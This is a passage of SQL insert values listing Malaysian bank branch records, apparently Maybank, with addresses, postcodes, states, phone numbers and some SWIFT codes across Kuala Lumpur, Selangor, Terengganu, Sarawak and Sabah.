(135, 10, 3, ' Lots: F1/26 & 27, City Point, Dayabumi Complex, Jalan Sultan Hishamuddin, ', ' Kuala Lumpur', '50500', ' Kuala Lumpur', '+603-2710 2668', NULL, NULL, NULL, NULL),
(136, 10, 3, 'Aras B1 Kompleks Mahkamah Jalan Duta, ', 'Kuala Lumpur', '50592 ', 'Kuala Lumpur ', '+603-6201 0245', NULL, NULL, NULL, NULL),
(137, 10, 3, '12 & 13, Jalan TK 1/11A, Taman Kinrara Seksyen 1, Batu 7 1/2, Jalan Puchong, ', 'Kuala Lumpur', '58200 ', 'Kuala Lumpur', '+603-8070 2589', NULL, NULL, NULL, NULL),
(138, 10, 3, '209-10, Jalan Negara 2, Taman Melawati, ', 'Kuala Lumpur ', '53100 ', 'Kuala Lumpur ', '+603-4107 0115', NULL, NULL, NULL, NULL),
(139, 10, 3, 'No 1, 3, 5, 7 & 9 Medan Tuanku 1, ', 'Kuala Lumpur ', '50300 ', 'Kuala Lumpur ', '+603-2694 5358', NULL, NULL, NULL, NULL),
(140, 10, 3, 'Lot No. G-1&2, Ground Floor, Support Service Building, Technology Park Malaysia, Lebuhraya Puchong - Sg. Besi, Bukit Jalil, ', ' Kuala Lumpur ', '57000', ' Kuala Lumpur ', '+603-8996 1070', NULL, NULL, NULL, NULL),
(141, 10, 3, 'Tingkat Bawah (Kanan), Menara Perkeso, No 281, Jalan Ampang,', 'Kuala Lumpur ', '50538 ', 'Kuala Lumpur ', '+603-4251 5317', NULL, NULL, NULL, NULL),
(142, 10, 3, '11, 13 & 15, Ground & First Floor, Jalan Solaris 1, Mont Kiara, ', 'Kuala Lumpur ', '50480', ' Kuala Lumpur', '+603-6203 7435', NULL, NULL, NULL, NULL),
(143, 10, 3, 'No 803 - 817 Bangunan LIM, Batu 4 1/2, Jalan Ipoh, ', 'Kuala Lumpur', '50120 ', 'Kuala Lumpur', '+603-6252 4284', NULL, NULL, NULL, NULL),
(144, 10, 3, 'G(E) - 016, Ground Floor, Mid-Valley Megamall, Mid-Valley City, Lingkaran Syed Putra, ', 'Kuala Lumpur', '59200 ', 'Kuala Lumpur ', '+603-2282 8969', NULL, NULL, NULL, NULL),
(145, 10, 3, 'Lot 2.33B, Level 2, Pavilion Kuala Lumpur, 168, Jalan Bukit Bintang, ', 'Kuala Lumpur', '55100 ', 'Kuala Lumpur', '+603-2142 3395', NULL, NULL, NULL, NULL),
(146, 10, 3, 'No. 2 & 2A, Ground & 1st Floor, Jalan Wangsa Delima 11, D''Wangsa, KLSC Wangsa Maju, ', 'Kuala Lumpur ', '53300 ', 'Kuala Lumpur', '+603-4142 0508', NULL, NULL, NULL, NULL),
(147, 10, 3, '175, Jalan 2/3A, Bandar Utara Selayang, Off KM12, Jalan Ipoh,', 'Kuala Lumpur', ' 68100 ', 'Kuala Lumpur', '+603-6138 8025', NULL, NULL, NULL, NULL),
(148, 10, 3, 'Wisma Lee Kay Huan, Lot 14408 Jalan Genting Kelang, Setapak, ', 'Kuala Lumpur ', '53200 ', 'Kuala Lumpur ', '+603-4021 5311', NULL, NULL, NULL, NULL),
(149, 10, 3, '27, Jalan Segambut Pusat, ', 'Kuala Lumpur ', '51200 ', 'Kuala Lumpur', '+603-6257 1368', NULL, NULL, NULL, NULL),
(150, 10, 3, '12 & 14, Jalan 14/48A, The Boulevard Shop Office, Off Jalan Sentul, ', 'Kuala Lumpur ', '51000 ', 'Kuala Lumpur', '+603-4041 7726', NULL, NULL, NULL, NULL),
(151, 10, 3, 'No. 15 & 17, Jalan Radin Anum, Bandar Baru Seri Petaling, ', 'Kuala Lumpur ', '57000 ', 'Kuala Lumpur ', '+603-9057 2386', NULL, NULL, NULL, NULL),
(152, 10, 3, 'Suite 163-0-14, Ground Floor, Wisma Mah Sing, 163, Jalan Sungai Besi, ', 'Kuala Lumpur ', '57100 ', 'Kuala Lumpur ', '+603-9221 9841', NULL, NULL, NULL, NULL),
(153, 10, 3, 'Lot 10 & 12 Jalan 5/101C Jalan Kaskas 1, Batu 6 Jalan Cheras, ', 'Kuala Lumpur', '56000 ', 'Kuala Lumpur ', '+603-9132 5052', NULL, NULL, NULL, NULL),
(154, 10, 3, 'G-Floor, Bangunan Yayasan, Jalan Bukit Bintang, ', 'Kuala Lumpur ', '55100 ', 'Kuala Lumpur ', '+603-2142 8268', NULL, 'MBBEMYKLBBG', NULL, NULL),
(155, 10, 3, 'No 1 Jalan Menara Gading 1 Off Lebuhraya Timur Barat Cheras, ', 'Kuala Lumpur', '56340 ', 'Kuala Lumpur ', '+603-9101 1500', NULL, NULL, NULL, NULL),
(156, 10, 3, '188, Jalan Mahkota, Taman Maluri, ', 'Kuala Lumpur ', '55100 ', 'Kuala Lumpur', '+603-9281 3011', NULL, NULL, NULL, NULL),
(157, 10, 3, '102-6, Jalan Midah Satu, Taman Midah, Cheras, ', 'Kuala Lumpur ', '56000 ', 'Kuala Lumpur ', '+603-9131 1878', NULL, NULL, NULL, NULL),
(158, 10, 3, '37, Jalan Manis Enam, Taman Segar, Cheras, ', 'Kuala Lumpur ', '56100 ', 'Kuala Lumpur ', '+603-9130 5322', NULL, NULL, NULL, NULL),
(159, 10, 3, 'Wisma Prima Peninsular, No. 2, Jalan Setiawangsa 11, Taman Setiawangsa, ', 'Kuala Lumpur ', '54200 ', 'Kuala Lumpur ', '+603-4251 6722', NULL, NULL, NULL, NULL),
(160, 10, 3, '2, Lorong Rahim Kajai 14, Taman Tun Dr. Ismail, ', 'Kuala Lumpur ', '60000 ', 'Kuala Lumpur ', '+603-7729 3671', NULL, NULL, NULL, NULL),
(161, 10, 3, 'Ground & Mezzanine Floors, Wisma Genting, Jalan Sultan Ismail, ', ' Kuala Lumpur ', '50250', ' Kuala Lumpur', '+603-2163 5051', NULL, NULL, NULL, NULL),
(162, 10, 3, 'Wisma Hangsam, 1, Jalan Hang Lekir,', 'Kuala Lumpur ', ' 50000 ', 'Kuala Lumpur ', '+603-2070 5161', NULL, NULL, NULL, NULL),
(163, 10, 3, 'G2W Ground Floor Wisma Sime Darby, Jalan Raja Laut, ', 'Kuala Lumpur ', '50350 ', 'Kuala Lumpur ', '+603-2693 6121', NULL, 'MBBEMYKLWSD', NULL, NULL),
(164, 10, 3, '518A, Jalan Ipoh, ', 'Kuala Lumpur', '51200 ', 'Kuala Lumpur', '+603-4042 5828', NULL, NULL, NULL, NULL),
(165, 10, 3, 'G-Floor, Block C, Kompleks Pejabat Damansara, Jalan Semantan, Bukit Damansara, ', 'Kuala Lumpur', '50490 ', 'Kuala Lumpur ', '+603-2095 3259', NULL, NULL, NULL, NULL),
(166, 10, 3, 'Tingkat Bawah, Bangunan AHP, No 2, Jln Tun Mohd Fuad 3, Taman Tun Dr Ismail, ', 'Kuala Lumpur', '60000 ', 'Kuala Lumpur ', '+603-7729 0922', NULL, NULL, NULL, NULL),
(167, 10, 3, '70, Jalan 2A/27A, Seksyen 1, Bandar Wangsa Maju, ', 'Kuala Lumpur', '53300 ', 'Kuala Lumpur ', '+603-4143 9187', NULL, NULL, NULL, NULL),
(168, 10, 3, 'Lot E005, Ground Floor Podium, Financial Park, Labuan Complex, Jalan Merdeka, ', 'Labuan, ', '87000 ', 'Wilayah Persekutuan', '+6087-44 3390', NULL, NULL, NULL, NULL),
(169, 10, 3, 'Lot No. 5, Balai Berlepas, Terminal Udara Kuala Lumpur (KLCAT), Kuala Lumpur Sentral, ', 'Kuala Lumpur ', '50470 ', 'Kuala Lumpur ', '+603-2272 3703', NULL, 'MBBEMYKLKLC', NULL, NULL),
(170, 10, 3, ' R13 & R15, Bangunan Annexe, Dewan Persidangan, Kompleks Perbadanan Putrajaya, Precint 3, ', 'Putrajaya, ', '62675 ', 'Wilayah Persekutuan', '+603-8888 0366', NULL, NULL, NULL, NULL),
(171, 10, 3, 'Lots 405 & 406, Jalan Besar, ', 'Jerteh, ', '22000 ', 'Terengganu', '+609-697 2767', NULL, NULL, NULL, NULL),
(172, 10, 3, 'K11284 & K11285, Jalan Kubang Kurus, Taman Cukai Utama, Cukai, ', 'Kemaman, ', '24000 ', 'Terengganu', '+609-859 9132', NULL, NULL, NULL, NULL),
(173, 10, 3, 'Lot 40, Ground Floor, Mesra Mall, Lot 6490, Mukim Kerteh, Rantau Petronas,', 'Kerteh, ', ' 24300 ', 'Terengganu', '+609-864 2605', NULL, NULL, NULL, NULL),
(174, 10, 3, 'Lots 6312-3, Pekan Kuala Berang,', 'Kuala Berang, ', ' 21700 ', 'Terengganu ', '+609-681 1378', NULL, NULL, NULL, NULL),
(175, 10, 3, 'No 1-J, Kompleks Perdana, Jalan Air Jernih,', ' Kuala Terengganu,', ' 20300', ' Terengganu ', '+609-624 6757', NULL, NULL, NULL, NULL),
(176, 10, 3, 'No 92, Jalan Sultan Ismail,', ' Kuala Terengganu, ', ' 20200', 'Terengganu', '+609-622 1421', NULL, NULL, NULL, NULL),
(177, 10, 3, '40 - 41, Jalan Besar, Pusat Niaga Paka,', 'Paka,', ' 23100 ', 'Terengganu ', '+609-827 8122', NULL, NULL, NULL, NULL),
(178, 10, 3, 'No. 2 & 3, Jalan Memanda 7, Batu 4 1/2, Jalan Ampang, Taman Dato'' Ahmad Razali, ', 'Ampang,', '68000 ', 'Selangor ', '+603-4256 8506', NULL, NULL, NULL, NULL),
(179, 10, 3, '20G - 28G, Jalan Wawasan 4/5, Bandar Baru Ampang, ', 'Ampang, ', '68000 ', 'Selangor ', '+603-4270 1931', NULL, NULL, NULL, NULL),
(180, 10, 3, '9 & 11, Jalan Bunga Tanjung 9C, Taman Putra, ', 'Ampang, ', '68000 ', 'Selangor', '+603-4292 1296', NULL, NULL, NULL, NULL),
(181, 10, 3, 'No. 7 & 9, Jalan 9/9C, Seksyen 9, Bandar Baru Bangi, ', 'Bangi, ', '43650 ', 'Selangor', '+603-8926 1105', NULL, NULL, NULL, NULL),
(182, 10, 3, 'No.416, 418, & 420, Jalan Sultan Abdul Samad, ', 'Banting, ', '42700 ', 'Selangor', '+603-3187 1326', NULL, NULL, NULL, NULL),
(183, 10, 3, '77, Jalan 2/16, Bandar Baru Selayang,', 'Batu Caves, ', ' 68100 ', 'Selangor', '+603-6138 6357', NULL, NULL, NULL, NULL),
(184, 10, 3, 'No. 10, Jalan SG 1/2, Tmn Seri Gombak, ', 'Batu Caves, ', '68100 ', 'Selangor ', '+603-6187 7500', NULL, NULL, NULL, NULL),
(185, 10, 3, '2-4-6 Jalan SJ 14, Selayang Jaya, Selayang, ', 'Batu Caves, ', '68100 ', 'Selangor', '+603-6138 0877', NULL, NULL, NULL, NULL),
(186, 10, 3, '11-13, Jalan SG 3/14, Taman Sri Gombak, ', 'Batu Caves, ', '68100 ', 'Selangor', '+603-6186 3605', NULL, NULL, NULL, NULL),
(187, 10, 3, '15 & 16, Seksyen 3, Pekan Batu 11 Cheras, Jalan Balakong,', 'Cheras, ', ' 43200 ', 'Selangor', '+603-9075 4773', NULL, NULL, NULL, NULL),
(188, 10, 3, 'Prima 5-B, Jalan Teknokrat 5, ', 'Cyberjaya,', '63000 ', ' Selangor', '+603-8318 9744', NULL, NULL, NULL, NULL),
(189, 10, 3, 'No. 2, Jalan 6C/16, Section 16, Bandar Baru Bangi, ', 'Kajang, ', '46650 ', 'Selangor', '+603-8925 5142', NULL, NULL, NULL, NULL),
(190, 10, 3, 'No 30 Jalan SL 1/12 Bandar Sg Long, ', 'Kajang, ', '43200 ', 'Selangor', '+603-9010 4701', NULL, NULL, NULL, NULL),
(191, 10, 3, 'No 28 & 29, Jalan KP 1/2, Kajang Prima, Off Jln Semenyih, ', 'Kajang, ', '43000 ', 'Selangor', '+603-8733 7221', NULL, NULL, NULL, NULL),
(192, 10, 3, 'Ground & Mezzanine Floor 28-30, Jalan Tukang, ', 'Kajang, ', '43000 ', 'Selangor ', '+603-8737 6290', NULL, NULL, NULL, NULL),
(193, 10, 3, 'Sub-lots 157 & 158, Jalan Besar, Pekan Kapar, ', 'Kapar, ', '42200', 'Selangor ', '+603-3250 1527', NULL, NULL, NULL, NULL),
(194, 10, 3, '7 & 8, Jalan Tanjung SD 13/1, Bandar Sri Damansara, ', 'Kepong, ', '52200 ', 'Selangor', '+603-6273 5501', NULL, NULL, NULL, NULL),
(195, 10, 3, 'Lot G-50, Ground Floor, AEON Bukit Tinggi Shopping Centre, 1, Persiaran Batu Nilam 1/KS 6, Bandar Bukit Tinggi 2, ', 'Klang, ', '42100 ', 'Selangor', '+603-3326 2451', NULL, NULL, NULL, NULL),
(196, 10, 3, '32, Lorong Tiara 1A, Bandar Baru Klang, ', ' Klang, ', '41150', 'Selangor ', '+603-3344 7842', NULL, NULL, NULL, NULL),
(197, 10, 3, 'Suite 1.01 & 2.01, Intan Millennium Square, 68, Jalan Batai Laut 4, Taman Intan, ', 'Klang,', '41300 ', ' Selangor', '+603-3341 6868', NULL, NULL, NULL, NULL),
(198, 10, 3, '14 - 22, Jalan Kepayang, Off Jalan Meru, ', 'Klang,', '41050 ', ' Selangor', '+603-3342 7322', NULL, NULL, NULL, NULL),
(199, 10, 3, '26, 28 & 30, Jalan Raja Hassan, Menara Klang, ', ' Klang,', '41400', ' Selangor ', '+603-3342 4934', NULL, NULL, NULL, NULL),
(200, 10, 3, '188 & 190, Jalan Batu Unjur 1, Bayu Perdana, ', 'Klang, ', '41200 ', 'Selangor ', '+603-3323 0669', NULL, NULL, NULL, NULL),
(201, 10, 3, 'Lot C1-1-0 & C1-1-1, Phase 1F1, Lebuh Batu Nilam, Bandar Bukit Tinggi 1, ', 'Klang, ', '41400 ', 'Selangor', '+603-3325 1002', NULL, NULL, NULL, NULL),
(202, 10, 3, 'Unit 1A & 1B, Block E, Jalan KLIA S3, Southern Common Amenities Facility, Kuala Lumpur International Airport (Selatan), ', 'KLIA, ', '64000 ', 'Selangor ', '+603-8787 3007', NULL, NULL, NULL, NULL),
(203, 10, 3, '45 & 46, Jalan Dato'' Muda Jaffar,', 'Kuala Kubu Bahru, ', ' 44000 ', 'Selangor ', '+603-6064 3862', NULL, NULL, NULL, NULL),
(204, 10, 3, 'L1-03 , L1-06, L2-03, Level 1 & 2, Menara Maxisegar, Jalan Pandan Indah 4/2, Pandan Indah, ', 'Kuala Lumpur ', '55100 ', 'Kuala Lumpur ', '+603-4296 2740', NULL, NULL, NULL, NULL),
(205, 10, 3, '16 & 16A, Jalan Pandan 3/6A, Taman Pandan Jaya, ', 'Kuala Lumpur ', '55100 ', 'Kuala Lumpur ', '+603-9286 1908', NULL, NULL, NULL, NULL),
(206, 10, 3, '11 & 13, Jalan Raja Jalil, ', 'Kuala Selangor, ', '45000 ', 'Selangor ', '+603-3289 1754', NULL, NULL, NULL, NULL),
(207, 10, 3, 'Lot C.01, Concourse Level, 8, First Avenue, Bandar Utama, ', 'Petaling Jaya, ', '47800 ', 'Selangor ', '+603-7728 6724', NULL, NULL, NULL, NULL),
(208, 10, 3, 'No. 30 & 32, Jalan PJS 11/28A, Bandar Sunway, ', ' Petaling Jaya,', '46150', ' Selangor ', '+603-5637 0872', NULL, NULL, NULL, NULL),
(209, 10, 3, ' Lot A09 & A10, Jalan PJU 10/2A PJU 10 Damansara Damai, ', 'Petaling Jaya, ', '47830 ', 'Selangor ', '+603-6156 8158', NULL, NULL, NULL, NULL),
(210, 10, 3, 'No 65 & 67, Jln SS 22/19, Damansara Jaya,', 'Petaling Jaya, ', ' 47400 ', 'Selangor ', '+603-7722 4787', NULL, NULL, NULL, NULL),
(211, 10, 3, ' 62-66, Jalan SS21/35, Damansara Utama, ', 'Petaling Jaya, ', '47400 ', 'Selangor ', '+603-7729 1449', NULL, NULL, NULL, NULL),
(212, 10, 3, '11, Jalan 51A/222, ', 'Petaling Jaya, ', '46100 ', 'Selangor ', '+603-7957 0879', NULL, NULL, NULL, NULL),
(213, 10, 3, 'Ground Floor, Wisma IJM, Jalan Yong Shook Lin, ', 'Petaling Jaya, ', '46200 ', 'Selangor ', '+603-7956 9523', NULL, 'MBBEMYKLYSL', NULL, NULL),
(214, 10, 3, 'G-M Floor, Bangunan CGC, 97, Kelana Business Centre, Jalan SS7/2,', 'Petaling Jaya, ', ' 47301 ', 'Selangor', '+603-7805 1194', NULL, NULL, NULL, NULL),
(215, 10, 3, '115-117, Block E, Kelana Park View, No. 1, Jalan SS6/2, Kelana Jaya, ', 'Petaling Jaya, ', '47301 ', 'Selangor ', '+603-7804 2624', NULL, NULL, NULL, NULL),
(216, 10, 3, 'No. 30, Jalan Teknologi, Seksyen 2, PJU 3, Kota Damansara, ', 'Petaling Jaya, ', '47810 ', 'Selangor', '+603-6156 2422', NULL, NULL, NULL, NULL),
(217, 10, 3, 'Lot G96, Ground Level, The Curve Mutiara Damansara, ', ' Petaling Jaya, ', '47800', 'Selangor ', '+603-7728 9379', NULL, NULL, NULL, NULL),
(218, 10, 3, '50-52, Jalan Sultan (52/4), ', 'Petaling Jaya,', '46200 ', ' Selangor ', '+603-7958 1348', NULL, 'MBBEMYKLPJY', NULL, NULL),
(219, 10, 3, '29, Jalan Othman 3/14, ', 'Petaling Jaya, ', '46200 ', 'Selangor ', '+603-7783 8652', NULL, NULL, NULL, NULL),
(220, 10, 3, '1, Jalan 21/11A, SEA Park, ', ' Petaling Jaya,', '46300', ' Selangor ', '+603-7876 3823', NULL, NULL, NULL, NULL),
(221, 10, 3, '18A, Jalan 14/14, ', 'Petaling Jaya, ', '46100 ', 'Selangor ', '+603-7960 7977', NULL, NULL, NULL, NULL),
(222, 10, 3, '8 & 10, Jalan SS 2/63, ', 'Petaling Jaya,', '47300 ', ' Selangor', '+603-7876 7662', NULL, NULL, NULL, NULL),
(223, 10, 3, 'C8, C9 & C10, Jalan SS15/4D, Subang Jaya,', ' Petaling Jaya, ', ' 47500', 'Selangor', '+603-5633 9015', NULL, NULL, NULL, NULL),
(224, 10, 3, 'Lot F1.78 & F1.79, First Floor, Sunway Pyramid, No. 3, Jalan PJS 11/15, Bandar Sunway, ', 'Petaling Jaya,', '46150 ', ' Selangor ', '+603-5622 1240', NULL, NULL, NULL, NULL),
(225, 10, 3, '93 & 95, Jalan SS25/2, Taman Bukit Emas,', 'Petaling Jaya, ', ' 47301 ', 'Selangor', '+603-7803 1347', NULL, NULL, NULL, NULL),
(226, 10, 3, '60-64, Persiaran Raja Muda Musa, ', 'Port Klang, ', '42000 ', 'Selangor ', '+603-3168 2626', NULL, 'MBBEMYKLPKG', NULL, NULL),
(227, 10, 3, 'Lot F31 & F32, 1st Floor, Giant Hypermarket Bandar Kinrara, Lot 449, Jalan BK 5A/1, Bandar Kinrara,', 'Puchong, ', ' 47100 ', 'Selangor ', '+603-8070 8477', NULL, NULL, NULL, NULL),
(228, 10, 3, 'No. 7, Jalan Kenari 1, Bandar Puchong Jaya, Jalan Puchong, ', 'Puchong, ', '47100 ', 'Selangor ', '+603-5882 0275', NULL, NULL, NULL, NULL),
(229, 10, 3, 'H-01-10 & H-01-09, H-02-14 & H-02-13 Ground Floor & 1st Floor Block H, Pusat Perdagangan Puchong Prima, Jalan Prima 5/4, Taman Puchong Prima, ', 'Puchong, ', '47100 ', 'Selangor ', '+603-8061 0921', NULL, NULL, NULL, NULL),
(230, 10, 3, 'No 32 & 34, Jalan Bandar Tiga, Pusat Bandar Puchong, ', ' Puchong, ', '47000', 'Selangor ', '+603-8070 5292', NULL, NULL, NULL, NULL),
(231, 10, 3, 'No 29 & 31, Jln Puteri 1/4, Bandar Puteri Puchong, ', ' Puchong, ', '47100', 'Selangor', '+603-8063 5142', NULL, NULL, NULL, NULL),
(232, 10, 3, ' 80K, Jalan Sekolah,', 'Pulau Ketam, ', ' 42940 ', 'Selangor ', '+603-3110 4506', NULL, NULL, NULL, NULL),
(233, 10, 3, '17, Jalan Bandar Rawang 2, Bandar Baru Rawang, ', 'Rawang, ', '48000 ', 'Selangor', '+603-6091 2316', NULL, NULL, NULL, NULL),
(234, 10, 3, '29 & 31, Jalan Menteri, ', 'Sabak Bernam, ', '45200 ', 'Selangor ', '+603-3216 1377', NULL, NULL, NULL, NULL),
(235, 10, 3, '82-83, Jalan Ria, ', 'Sekinchan, ', '45400 ', 'Selangor ', '+603-3241 0351', NULL, NULL, NULL, NULL),
(236, 10, 3, '3, Jalan Pasar 2, Bandar Semenyih, ', 'Semenyih, ', '43500 ', 'Selangor ', '+603-8723 8611', NULL, NULL, NULL, NULL),
(237, 10, 3, '4 & 6, Jalan ST 1C/4, Bandar Baru Salak Tinggi, ', 'Sepang,', '43900 ', ' Selangor ', '+603-8706 3549', NULL, NULL, NULL, NULL),
(238, 10, 3, 'G-M Floor, Wisma SSP, 1, Jalan SR 8/3, Serdang Jaya, Seksyen 8,', 'Seri Kembangan, ', ' 43300 ', 'Selangor ', '+603-8948 8237', NULL, NULL, NULL, NULL),
(239, 10, 3, 'Lots 231-3, Jalan 18/23, Taman Sri Serdang, ', 'Seri Kembangan, ', '43300 ', 'Selangor ', '+603-8945 1201', NULL, NULL, NULL, NULL),
(240, 10, 3, 'B-1, Block B, Persiaran Akademi Perdana, Taman Equine, Bandar Putra Permai, ', 'Seri Kembangan,', '43300 ', ' Selangor ', '+603-8945 7012', NULL, NULL, NULL, NULL),
(241, 10, 3, 'A-1-G, Jalan Multimedia 7/AH, CityPark, i - City, ', ' Shah Alam, ', '40000', 'Selangor', '+603-5521 8441', NULL, NULL, NULL, NULL),
(242, 10, 3, 'No 20, Jln Tengku Ampuan Zabedah D 9/D, Section 9, ', 'Shah Alam,', '40100 ', ' Selangor', '+603-5880 8957', NULL, NULL, NULL, NULL),
(243, 10, 3, 'No. 9 & 11, Jalan Anggerik Vanila N31/N, Kota Kemuning,', 'Shah Alam, ', ' 40460 ', 'Selangor', '+603-5121 0024', NULL, NULL, NULL, NULL),
(244, 10, 3, '44, 46 & 48, Jalan Pinang C, 18/C, Seksyen 18, ', 'Shah Alam, ', '40200 ', 'Selangor ', '+603-5542 1536', NULL, NULL, NULL, NULL),
(245, 10, 3, 'No. 19 & 21, Jalan Singa C, 20/C, Seksyen 20,', 'Shah Alam, ', ' 40000 ', 'Selangor ', '+603-5032 0808', NULL, NULL, NULL, NULL),
(246, 10, 3, '10, Persiaran Perbandaran, Section 14,', 'Shah Alam,', ' 40000 ', ' Selangor ', '+603-5519 9289', NULL, 'MBBEMYKLSHA', NULL, NULL),
(247, 10, 3, 'No. 1, Jalan Dinar G U3/G, Taman Subang Perdana, Seksyen U3, ', 'Shah Alam, ', '40150 ', 'Selangor ', '+603-7847 5817', NULL, NULL, NULL, NULL),
(248, 10, 3, '3 & 5, Jalan 1/4, Seksyen U2, TTDI Jaya, ', ' Shah Alam, ', '40000', 'Selangor ', '+603-7847 2235', NULL, NULL, NULL, NULL),
(249, 10, 3, 'No. 2, Persiaran Setia Impian, Setia Alam, Section U13, ', ' Shah Alam, ', '40170', 'Selangor', '+603-3343 3960', NULL, NULL, NULL, NULL),
(250, 10, 3, 'Terminal 3, Sultan Abdul Aziz Shah Airport, ', 'Subang, ', '47200 ', 'Selangor ', '+603-7846 4355', NULL, NULL, NULL, NULL),
(251, 10, 3, '66, Jalan USJ 10/1B, UEP Subang Jaya, ', ' Subang Jaya,', '47620', ' Selangor ', '+603-5634 8058', NULL, NULL, NULL, NULL),
(252, 10, 3, 'No. 39, Jalan USJ 10/1G, ', 'Subang Jaya, ', '47620 ', 'Selangor ', '+603-5631 4341', NULL, NULL, NULL, NULL),
(253, 10, 3, 'G01, West Tower, Ground Floor, Wisma Consplant, 1, 2, Jln SS16/4,', ' Subang Jaya, ', ' 47500', 'Selangor ', '+603-5632 5092', NULL, NULL, NULL, NULL),
(254, 10, 3, '30E & 32E, Jalan Mashuri, ', ' Sungai Besar, ', '45300', 'Selangor', '+603-3224 2166', NULL, NULL, NULL, NULL),
(255, 10, 3, 'No. 354 & 355, Jalan 1A/3, Bandar Baru Sungai Buloh, ', 'Sungai Buloh, ', '47000 ', 'Selangor ', '+603-6156 8150', NULL, NULL, NULL, NULL),
(256, 10, 3, '18 - 20, Jalan Besar, ', 'Tanjong Karang, ', '45500 ', 'Selangor ', '+603-3269 8037', NULL, NULL, NULL, NULL),
(257, 10, 3, '80 - 82, Jalan Temenggong Salau,', 'Bau,', ' 94000 ', ' Sarawak', '+6082-76 3398', NULL, NULL, NULL, NULL),
(258, 10, 3, '24 - 25, New Commercial Centre, Jalan Abang Galau, ', 'Bintulu,', '97000 ', ' Sarawak ', '+6086-33 3211', NULL, NULL, NULL, NULL),
(259, 10, 3, 'No. 11 & 12, Medan Sentral Commercial Centre, Jalan Tanjung Kidurong, ', 'Bintulu, ', '97000 ', 'Sarawak', '+6086-31 7822', NULL, NULL, NULL, NULL),
(260, 10, 3, '73B & C, Jalan Airport, ', ' Kapit, ', '96800', 'Sarawak', '+6084-79 6644', NULL, NULL, NULL, NULL),
(261, 10, 3, 'CG103 - CG107, Batu Kawah New Township, Jalan Batu Kawah, ', 'Kuching,', '93250 ', ' Sarawak', '+6082-46 1875', NULL, NULL, NULL, NULL),
(262, 10, 3, '194, Ground Floor, Al-Idrus Commercial Centre, Jalan Satok, ', ' Kuching, ', '93400', 'Sarawak', '+6082-25 9999', NULL, NULL, NULL, NULL),
(263, 10, 3, 'Lots D36-1, D37-1, D38-1 & D38-2 (Corner Lot), Yoshikawa Commercial Centre, Jalan Pelabuhan, ', 'Kuching, ', '94350 ', 'Sarawak', '+6082-48 5315', NULL, NULL, NULL, NULL),
(264, 10, 3, 'Lots 250-253, Jalan Tunku Abdul Rahman, ', 'Kuching, ', '93100 ', 'Sarawak ', '+6082-25 0766', NULL, NULL, NULL, NULL),
(265, 10, 3, 'No. 65 - 67, Lot 3179 - 3181, Block 10, Jalan Laksamana Cheng Ho, ', ' Kuching, ', '93200', 'Sarawak ', '+6082-42 1975', NULL, NULL, NULL, NULL),
(266, 10, 3, 'Level 1, Wisma Satok, Jalan Satok, ', ' Kuching,', '93400', ' Sarawak ', '+6082-42 8569', NULL, NULL, NULL, NULL),
(267, 10, 3, ' Lots 1949-1951, Ground Floor, Kota Sentosa Batu 7, Jalan Penrissen, ', 'Kuching, ', '93250 ', 'Sarawak ', '+6082-61 6244', NULL, NULL, NULL, NULL),
(268, 10, 3, 'Lots 231 - 233, Jalan Sloating,', ' Lawas, ', ' 98850', 'Sarawak ', '+6085-28 5397', NULL, NULL, NULL, NULL),
(269, 10, 3, '57, Lorong Maybank, ', ' Limbang, ', '98700', 'Sarawak', '+6085-21 2277', NULL, NULL, NULL, NULL),
(270, 10, 3, 'Lots 2429 & 2430, Boulevard Centre, Jalan Permaisuri Pujut,', 'Miri,', ' 98000 ', ' Sarawak', '+6085-43 0793', NULL, NULL, NULL, NULL),
(271, 10, 3, 'Lot 112, Jalan Bendahara, ', 'Miri, ', '98000 ', 'Sarawak ', '+6085-41 7766', NULL, NULL, NULL, NULL),
(272, 10, 3, 'Wisma Yong Lung, Ground & 1st Floor, Lot 698, Block 7, MCLD, Jalan Pujut, C.D.T. No. 28, ', ' Miri, ', '98000', 'Sarawak', '+6085-41 1877', NULL, NULL, NULL, NULL),
(273, 10, 3, 'DG.01, Block D, E-Mart Commercial Centre, Jalan Tudan,', 'Miri, ', ' 98100 ', 'Sarawak ', '+6085-66 0348', NULL, NULL, NULL, NULL),
(274, 10, 3, 'No 35 & 36, Lot 512 Block 68, Mukah New Township, ', 'Mukah, ', '96400 ', 'Sarawak ', '+6084-87 1735', NULL, NULL, NULL, NULL),
(275, 10, 3, '18 & 19, Jalan Getah, ', 'Sarikei, ', '96100 ', 'Sarawak ', '+6084-65 7714', NULL, NULL, NULL, NULL),
(276, 10, 3, 'Lot 645, 646 & 647, Block 6, Jalan Kampong Nyabor, ', ' Sibu, ', '96000', 'Sarawak', '+6084-34 5111', NULL, NULL, NULL, NULL),
(277, 10, 3, '35, 37, 39, 41, 43, 45, Jalan Kampung Nyabor, ', ' Sibu, ', '96000', 'Sarawak ', '+6084-33 2082', NULL, NULL, NULL, NULL),
(278, 10, 3, 'No. 43 & 44, Lorong 17, Jalan Salim, ', 'Sibu, ', '96000 ', 'Sarawak ', '+6084-21 9403', NULL, NULL, NULL, NULL),
(279, 10, 3, 'Lots 11 &12;, Block C, Foo Long Shopping Complex,', ' Keningau, ', ' 89000', 'Sabah ', '+6087-33 8189', NULL, NULL, NULL, NULL),
(280, 10, 3, 'Lot 1, Nountun Industrial Estate, Mile 5.5, Jalan Tuaran,', 'Kota Kinabalu, ', ' 88450 ', 'Sabah ', '+6088-42 0425', NULL, NULL, NULL, NULL),
(281, 10, 3, 'Lot 6 & 7, Jalan Perpaduan, Kampong Air, ', 'Kota Kinabalu, ', '88000 ', 'Sabah ', '+6088-24 3827', NULL, NULL, NULL, NULL),
(282, 10, 3, ' Bangunan Maybank, No. 1, Lorong Kemajuan, Karamunsing,', 'Kota Kinabalu,', ' 88000 ', ' Sabah', '+6088-23 3913', NULL, NULL, NULL, NULL),
(283, 10, 3, '9, Beach Street, ', 'Kota Kinabalu,', '88000 ', ' Sabah', '+6088-21 5030', NULL, 'MBBEMYKLKIN', NULL, NULL),
(284, 10, 3, 'No 27, Block D, Lintas Square, Jalan Lintas,', 'Kota Kinabalu,', ' 88300 ', ' Sabah ', '+6088-23 5631', NULL, NULL, NULL, NULL),
(285, 10, 3, 'Ground & First Floor, Lot 10 & 11, Putatan Court, Putatan Square Phase II, Lorong Putatan 1, ', 'Kota Kinabalu, ', '88200 ', 'Sabah ', '+6088-76 1695', NULL, NULL, NULL, NULL),
(286, 10, 3, 'No. 14-16, Block K, Jalan Ikan Juara Satu, Sadong Jaya, Karamunsing,', 'Kota Kinabalu, ', ' 88100 ', 'Sabah ', '+6088-24 4352', NULL, NULL, NULL, NULL),
